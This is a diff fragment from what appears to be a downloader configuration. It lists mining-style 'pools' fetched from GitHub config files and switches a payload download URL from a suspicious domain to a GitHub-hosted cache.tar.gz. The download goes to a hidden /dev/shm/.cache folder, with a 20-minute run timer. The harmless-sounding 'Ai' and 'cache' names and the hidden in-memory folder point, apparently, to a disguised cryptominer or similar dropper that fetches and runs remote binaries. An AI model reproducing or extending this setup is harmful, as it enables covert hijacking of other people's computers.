@@ -13,7 +13,7 @@ pools = [
     "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/config.ini",  #
     "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-04/refs/heads/main/config.ini",  #
 ]
-download_url = "https://ai.myloveistrikupoppy.my.id/cache"
+download_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"
 download_output = "cache.tar.gz"
 binary_folder = "/dev/shm/.cache"
 run_minutes = 20
